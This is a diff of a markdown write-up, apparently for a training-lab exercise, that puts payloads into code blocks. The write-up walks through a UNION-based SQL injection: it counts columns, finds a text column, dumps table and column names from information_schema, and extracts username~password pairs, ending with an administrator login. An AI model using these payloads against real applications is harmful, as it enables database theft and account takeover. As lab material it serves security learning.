@@ -53,7 +53,7 @@ Captured the request in Burp to identify the injection point.
 
 ![1](SQLi__PoC_/1.png)
 
-➤ Why?
+**➤ Why?**
 We need the baseline request containing the `category` parameter.
 
 ---
@@ -62,7 +62,9 @@ We need the baseline request containing the `category` parameter.
 
 Payload added to URL:
 
+```
 +UNION+SELECT+NULL,NULL--
+```
 
 This renders correctly, and the output shows:
 
@@ -70,7 +72,7 @@ Gifts' UNION SELECT NULL,NULL--
 
 ![2](SQLi__PoC_/2.png)
 
-➤ Why?
+**➤ Why?**
 The backend uses **2 columns**, confirmed by successful response.
 
 ---
@@ -79,18 +81,24 @@ The backend uses **2 columns**, confirmed by successful response.
 
 Testing second column:
 
+```
 +UNION+SELECT+NULL,'a'--
+```
 
 Works perfectly.
 
 Testing other combos:
-
+```
 +UNION+SELECT+'a',NULL-- → 500 error
+```
+
+```
 +UNION+SELECT+'a','b'-- → 500 error
+```
 
 ![3](SQLi__PoC_/3.png)
 
-➤ Why?
+**➤ Why?**
 Only **column 2** accepts strings.
 Column 1 is non-text (integer).
 
@@ -100,13 +108,15 @@ Column 1 is non-text (integer).
 
 Payload:
 
+```
 +UNION+SELECT+NULL,+table_name+FROM+information_schema.tables--
+```
 
 This dumps a massive list of PostgreSQL system tables.
 
 ![4](SQLi__PoC_/4.png)
 
-➤ Why?
+**➤ Why?**
 Among all results, one table stands out clearly:
 **users**
 This is our target.
@@ -117,7 +127,9 @@ This is our target.
 
 Payload:
 
+```
 +UNION+SELECT+NULL,+column_name+FROM+information_schema.columns+WHERE+table_name='users'--
+```
 
 Output:
 
@@ -127,7 +139,7 @@ username
 
 ![5](SQLi__PoC_/5.png)
 
-➤ Why?
+**➤ Why?**
 We now know exactly which fields to extract.
 
 ---
@@ -136,7 +148,9 @@ We now know exactly which fields to extract.
 
 Payload:
 
+```
 +UNION+SELECT+NULL,username||'~'||password+FROM+users--
+```
 
 Output:
 
@@ -146,7 +160,7 @@ administrator~iw82lgcs8vwqgtc7ert8
 
 ![6](SQLi__PoC_/6.png)
 
-➤ Why?
+**➤ Why?**
 We use `||` to return **two values inside the single text column**.
 
 This is the key trick for this lab.
@@ -163,7 +177,7 @@ password: iw82lgcs8vwqgtc7ert8
 
 ![7](SQLi__PoC_/7.png)
 
-➤ Why?
+**➤ Why?**
 Administrator login completes the lab requirement.
 
 ---
